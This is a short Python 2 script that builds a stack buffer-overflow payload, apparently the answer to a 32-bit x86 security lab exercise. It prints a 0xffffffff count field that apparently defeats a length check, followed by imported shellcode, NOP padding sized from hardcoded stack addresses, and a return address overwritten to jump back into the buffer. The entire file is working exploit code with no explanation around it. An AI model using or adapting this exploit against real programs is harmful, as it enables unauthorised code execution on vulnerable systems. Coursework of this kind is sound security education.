from shellcode import shellcode
from struct import pack

ebp = 0xbffef468
buf = 0xbffef430
count = 0xffffffff
padding = '\x90' * (ebp - buf + 4 - len(shellcode))

print pack("<I", count) + shellcode + padding + pack("<I", buf)
